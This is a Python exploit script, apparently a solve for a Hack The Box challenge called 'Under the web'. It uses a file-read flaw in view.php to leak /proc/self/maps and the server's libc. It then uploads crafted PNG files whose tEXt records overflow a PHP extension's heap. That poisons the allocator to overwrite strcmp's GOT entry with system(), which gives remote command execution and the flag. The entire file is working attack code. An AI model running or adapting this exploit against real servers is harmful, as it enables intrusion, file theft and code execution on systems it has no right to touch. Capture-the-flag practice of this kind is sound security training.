#!/usr/bin/env python3
import argparse
import base64
import binascii
import os
import re
import struct
import subprocess
import tempfile
import time
import urllib.parse
import urllib.request
import zlib


def p64(value):
    return struct.pack("<Q", value)


def chunk(kind, data):
    body = kind + data
    return struct.pack(">I", len(data)) + body + struct.pack(">I", binascii.crc32(body) & 0xffffffff)


def png(texts):
    # A minimal valid 1x1 RGB PNG. libpng returns the tEXt records in this order.
    out = b"\x89PNG\r\n\x1a\n"
    out += chunk(b"IHDR", struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0))
    for key, value in texts:
        out += chunk(b"tEXt", key + b"\0" + value)
    out += chunk(b"IDAT", zlib.compress(b"\x00\x00\x00\x00"))
    out += chunk(b"IEND", b"")
    return out


class Target:
    def __init__(self, base):
        self.base = base.rstrip("/")

    def request(self, path, data=None, headers=None, timeout=15):
        req = urllib.request.Request(self.base + path, data=data, headers=headers or {})
        with urllib.request.urlopen(req, timeout=timeout) as response:
            return response.read()

    def read_file(self, path):
        quoted = urllib.parse.quote(path, safe="/")
        page = self.request("/view.php?image=" + quoted)
        match = re.search(rb'data:image/png;base64,([^" ]+)', page)
        if not match:
            raise RuntimeError("LFI response did not contain a file")
        return base64.b64decode(match.group(1))

    def upload(self, filename, contents):
        boundary = "----under-the-web-1337"
        body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'
            "Content-Type: image/png\r\n\r\n"
        ).encode() + contents + f"\r\n--{boundary}--\r\n".encode()
        return self.request(
            "/upload.php", body,
            {"Content-Type": "multipart/form-data; boundary=" + boundary},
        )


def mapping_bases(maps):
    ext = libc = None
    for line in maps.decode(errors="replace").splitlines():
        fields = line.split()
        if len(fields) < 6 or fields[2] != "00000000":
            continue
        start = int(fields[0].split("-")[0], 16)
        path = fields[-1]
        if path.endswith("/metadata_reader.so"):
            ext = start
        elif path.endswith("/libc.so.6"):
            libc = start
    if ext is None or libc is None:
        raise RuntimeError("could not locate extension/libc bases in /proc/self/maps")
    return ext, libc


def symbol_offset(blob, symbol):
    fd, path = tempfile.mkstemp(prefix="under-web-libc-", suffix=".so")
    try:
        with os.fdopen(fd, "wb") as handle:
            handle.write(blob)
        output = subprocess.check_output(["readelf", "-Ws", path], text=True)
        pattern = re.compile(r"^\s*\d+:\s*([0-9a-fA-F]+).*\b" + re.escape(symbol) + r"@@", re.M)
        match = pattern.search(output)
        if not match:
            raise RuntimeError(f"could not find {symbol} in remote libc")
        return int(match.group(1), 16)
    finally:
        try:
            os.unlink(path)
        except FileNotFoundError:
            pass


def main():
    parser = argparse.ArgumentParser(description="Solve HTB Under the web")
    parser.add_argument("url", nargs="?", default="http://154.57.164.74:30256")
    args = parser.parse_args()
    target = Target(args.url)

    maps = target.read_file("/proc/self/maps")
    ext_base, libc_base = mapping_bases(maps)
    remote_libc = target.read_file("/usr/lib/x86_64-linux-gnu/libc.so.6")
    system = libc_base + symbol_offset(remote_libc, "system")
    strcmp_got = ext_base + 0x4058
    print(f"[+] metadata_reader base: {ext_base:#x}")
    print(f"[+] libc base:            {libc_base:#x}")
    print(f"[+] system:               {system:#x}")
    print(f"[+] strcmp GOT:           {strcmp_got:#x}")

    if b"\0" in p64(strcmp_got)[:6] or b"\0" in p64(system)[:6]:
        raise RuntimeError("unexpected zero byte in six-byte pointer")

    # The extension uses Zend's dedicated 56-byte small bin. In this one
    # parser invocation the allocations are:
    # structure A, Artist B, Title C, Copyright D, followed by free slot E.
    # Overflowing D by 56 bytes replaces E's free-list pointer with strcmp@GOT.
    poison_value = b"P" * 56 + p64(strcmp_got)[:6]
    command = b"ls -1 /app > uploads/leak.png"
    # A 56-byte small run has 73 slots. Sweep a complete period because the
    # number of recycled slots already at the bin head is request-dependent.
    # At least one count puts D and E next to each other in a fresh run.
    listing = None
    for delta in range(73):
        exploit_records = [(b"Title", b"groom") for _ in range(80 + delta)]
        exploit_records += [
            (b"Artist", b"AA"),
            (b"Title", b"CC"),
            (b"Copyright", poison_value),
            (b"Copyright", b"EE"),     # E makes the GOT the bin head
            (b"Copyright", p64(system)[:6]),
            (command, b"XX"),           # next strcmp(command, "Title")
        ]
        try:
            target.upload(f"exploit_{delta:02d}.png", png(exploit_records))
        except Exception:
            pass
        try:
            listing = target.read_file("/app/uploads/leak.png").decode(errors="replace")
            print(f"[+] heap alignment found at groom delta {delta}")
            break
        except Exception:
            if delta % 8 == 7:
                print(f"[*] tried {delta + 1}/73 heap alignments")

    if listing is None:
        raise RuntimeError("RCE did not create uploads/leak.png")

    for _ in range(15):
        try:
            if listing is None:
                listing = target.read_file("/app/uploads/leak.png").decode(errors="replace")
            break
        except Exception:
            time.sleep(0.3)
    else:
        raise RuntimeError("RCE did not create uploads/leak.png")

    names = re.findall(r"(?m)^([0-9a-f]{64})$", listing)
    if not names:
        raise RuntimeError("random flag filename not found in: " + repr(listing))
    flag = target.read_file("/app/" + names[0]).decode(errors="replace").strip()
    print("[+] flag:", flag)


if __name__ == "__main__":
    main()
